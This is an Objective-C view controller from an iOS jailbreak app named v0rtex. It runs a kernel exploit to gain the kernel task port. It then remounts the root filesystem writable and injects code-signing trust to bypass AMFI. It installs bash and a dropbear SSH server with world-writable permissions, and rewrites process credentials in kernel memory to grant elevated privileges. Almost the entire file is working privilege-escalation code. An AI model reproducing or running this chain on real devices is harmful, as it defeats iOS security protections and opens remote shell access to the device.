//
//  ViewController.m
//  v0rtex
//
//  Created by Sticktron on 2017-12-07.
//  Copyright © 2017 Sticktron. All rights reserved.
//

#import "ViewController.h"

#include "v0rtex.h"
#include "kernel.h"
#include "symbols.h"
#include "root-rw.h"
#include "libjb.h"
#include "patchfinder64.h"
#include "v0rtex.h"
#include "amfi.h"
#include <sys/spawn.h>
#include <sys/stat.h>
#include <CommonCrypto/CommonDigest.h>
#include <mach-o/loader.h>
#include <sys/dir.h>

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UITextView *outputView;
@property (weak, nonatomic) IBOutlet UIButton *sploitButton;
@end

@implementation ViewController

task_t tfp0;
kptr_t kslide;
kptr_t kern_ucred;

- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.sploitButton.layer.cornerRadius = 6;
    self.outputView.layer.cornerRadius = 6;
    
    // Attempt to init our offsets
    // Disable the run button if no offsets were found
    if (!init_symbols()) {
        [self writeText:@"Device not supported."];
        [self.sploitButton setHidden:TRUE];
        return;
    }
    
    [self writeText:@"> ready."];
}

- (IBAction)runSploitButton:(UIButton *)sender {
    
    // Run v0rtex
    
    [self writeText:@"> running exploit..."];
    
    tfp0 = MACH_PORT_NULL;
    kslide = 0;
    kern_ucred = 0;
    
    kern_return_t ret = v0rtex(&tfp0, &kslide, &kern_ucred);
    
    if (ret != KERN_SUCCESS) {
        [self writeText:@"ERROR: exploit failed"];
        return;
    }
    
    [self writeText:@"exploit succeeded!"];
    
    printf("got val for kern_ucred = %llu \n", kern_ucred);
    
    {
        // set up stuff
        int patch_init = init_patchfinder(tfp0, kslide + 0xFFFFFFF007004000, NULL);
        printf("init_patchfinder = %d \n", patch_init);
        
        init_amfi(tfp0);
    }
    
    {
        // Remount '/' as r/w
        int remountOutput = mount_root(tfp0, kslide);
        LOG("remount: %d", remountOutput);
        if (remountOutput != 0) {
            [self writeText:@"ERROR: failed to remount '/' as r/w"];
            return;
        }
        [self writeText:@"remounted '/' as r/w"];
    }
    
    {
        // Check we have '/' access
        bool rootAccess = can_write_root();
        [self writeText:[NSString stringWithFormat:@"can write to root: %@", rootAccess ? @"yes" : @"no"]];
        LOG("has root access: %s", rootAccess ? "yes" : "no");
    }
    
    // get kern proc
    /*
    uint64_t kern_proc = 0;
    uint64_t proc = rk64(tfp0, find_allproc());
    while (proc) {
        uint32_t pid = (uint32_t)rk32(tfp0, proc + 0x10);
        char name[40] = {0};
        printf("name: %s \n", name);
        
        if (pid == 0) {
            kern_proc = proc;
        }
        proc = rk64(tfp0, proc);
    }
    
    printf("found kern_proc at: 0x%016llx \n", kern_proc);
    
    // get kern creds
    uint64_t kern_ucred = rk64(tfp0, kern_proc + 0x100);
    printf("found kern_ucred at: 0x%016llx \n", kern_ucred);
    */
    
    // create v0rtex dir and init filemanager n bundlepath
    mkdir("/v0rtex", 0777);
    NSFileManager *fileMgr = [NSFileManager defaultManager];
    NSString *bundlePath = [NSString stringWithFormat:@"%s", bundle_path()];
    
    {
        // remove old files under '/v0rtex'
        [fileMgr removeItemAtPath:@"/v0rtex/launchctl" error:nil];
        [fileMgr removeItemAtPath:@"/v0rtex/dropbear" error:nil];
        [fileMgr removeItemAtPath:@"/v0rtex/dropbear.plist" error:nil];
        [fileMgr removeItemAtPath:@"/v0rtex/ls" error:nil];
        [fileMgr removeItemAtPath:@"/v0rtex/test_fsigned" error:nil];
        [fileMgr removeItemAtPath:@"/v0rtex/tar" error:nil];
        [fileMgr removeItemAtPath:@"/bin/sh" error:nil];
        [fileMgr removeItemAtPath:@"/bin/bash" error:nil];
        
        // copy in all our bins
        NSLog(@"copying in bins...");
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/launchctl"]
                         toPath:@"/v0rtex/launchctl" error:nil];
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/dropbear"]
                         toPath:@"/v0rtex/dropbear" error:nil];
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/dropbear.plist"]
                         toPath:@"/v0rtex/dropbear.plist" error:nil];
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/ls"]
                         toPath:@"/v0rtex/ls" error:nil];
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/tar"]
                         toPath:@"/v0rtex/tar" error:nil];
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/bash"]
                         toPath:@"/bin/bash" error:nil];
        [fileMgr linkItemAtPath:@"/bin/sh"
                         toPath:@"/bin/bash" error:nil];
        NSLog(@"done copying bins.");
        
        // make sure all our bins have perms
        chmod("/v0rtex/dropbear", 0777);
        chmod("/v0rtex/launchctl", 0777);
        chmod("/v0rtex/ls", 0777);
        chmod("/v0rtex/tar", 0777);
        chmod("/bin/bash", 0777);
        chmod("/bin/sh", 0777);
        
        // create dir's and files for dropbear
        mkdir("/etc", 0777);
        mkdir("/etc/dropbear", 0777);
        mkdir("/var", 0777);
        mkdir("/var/log", 0777);
        FILE *lastLog = fopen("/var/log/lastlog", "ab+");
        fclose(lastLog);
    }
    
    {
        // fuck amfi
        // trust_files("/bin");
        inject_trust("/bin/bash");
        inject_trust("/v0rtex/launchctl");
        inject_trust("/v0rtex/dropbear");
        inject_trust("/v0rtex/tar");
    }
    
    execprog(0, "/v0rtex/tar", NULL);
    
    // Launch dropbear
    execprog(0, "/v0rtex/dropbear", (const char **)&(const char*[]){ "/v0rtex/dropbear", "-R", "-E", "-m", "-F", NULL });
    // execprog(kern_ucred, "/v0rtex/launchctl", (const char**)&(const char*[]){ "/v0rtex/launchctl", "load", "/v0rtex/dropbear.plist", NULL });
    
    // Done.
    [self writeText:@"\n done."];
}

- (void)writeText:(NSString *)text {
    self.outputView.text = [self.outputView.text stringByAppendingString:[text stringByAppendingString:@"\n"]];
}

// creds to stek on this one
int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
    if (args == NULL) {
        args = (const char **)&(const char*[]){ prog, NULL };
    }
    
    const char *logfile = [NSString stringWithFormat:@"/tmp/%@-%lu",
                           [[NSMutableString stringWithUTF8String:prog] stringByReplacingOccurrencesOfString:@"/" withString:@"_"],
                           time(NULL)].UTF8String;
    printf("Spawning [ ");
    for (const char **arg = args; *arg != NULL; ++arg) {
        printf("'%s' ", *arg);
    }
    printf("] to logfile [ %s ] \n", logfile);
    
    int rv;
    posix_spawn_file_actions_t child_fd_actions;
    if ((rv = posix_spawn_file_actions_init (&child_fd_actions))) {
        perror ("posix_spawn_file_actions_init");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_addopen (&child_fd_actions, STDOUT_FILENO, logfile,
                                                O_WRONLY | O_CREAT | O_TRUNC, 0666))) {
        perror ("posix_spawn_file_actions_addopen");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_adddup2 (&child_fd_actions, STDOUT_FILENO, STDERR_FILENO))) {
        perror ("posix_spawn_file_actions_adddup2");
        return rv;
    }
    
    pid_t pd;
    if ((rv = posix_spawn(&pd, prog, &child_fd_actions, NULL, (char**)args, NULL))) {
        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
        return rv;
    }
    
    #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
    #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
    #define CS_HARD                 0x0000100    /* don't load invalid pages       */
    #define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
    #define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
    
    /*
     1. read 8 bytes from proc+0x100 into self_ucred
     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
     3. write 12 zeros to self_ucred + 0x18
     */
    
    // find_allproc will crash, currently
    // please fix
    if (kern_ucred != 0) {
        printf("kern ucred is not 0 = %llu", kern_ucred);
        int tries = 3;
        while (tries-- > 0) {
            sleep(1);
            uint64_t proc = rk64(tfp0, find_allproc());
            while (proc) {
                uint32_t pid = rk32(tfp0, proc + 0x10);
                if (pid == pd) {
                    uint32_t csflags = rk32(tfp0, proc + 0x2a8);
                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                    wk32(tfp0, proc + 0x2a8, csflags);
                    printf("empower\n");
                    tries = 0;

                    uint64_t self_ucred = rk32(tfp0, proc + 0x100);

                    uint32_t selfcred_temp = rk32(tfp0, kern_ucred + 0x78);
                    wk32(tfp0, self_ucred + 0x78, selfcred_temp);

                    for (int i = 0; i < 12; i++) {
                        wk32(tfp0, self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
                    }

                    printf("gave elevated perms to pid %d \n", pid);

                    // original stuff, rewritten above using v0rtex stuff
                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
                    break;
                }
                proc = rk64(tfp0, proc);
            }
        }
    }
    
    int status;
    waitpid(pd, &status, 0);
    printf("'%s' exited with %d (sig %d)\n", prog, WEXITSTATUS(status), WTERMSIG(status));
    
    char buf[65] = {0};
    int fd = open(logfile, O_RDONLY);
    if (fd == -1) {
        perror("open logfile");
        return 1;
    }
    
    printf("contents of %s: \n ------------------------- \n", logfile);
    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
        printf("%s", buf);
    }
    printf("%s", buf);
    printf("\n-------------------------\n");
    
    close(fd);
    remove(logfile);
    
    return 0;
}

bool can_write_root() {
    FILE *f = fopen("/file123.txt", "w");
    return f != 0;
}

char* bundle_path() {
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char* path = malloc(len);
    
    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
    
    return path;
}

@end
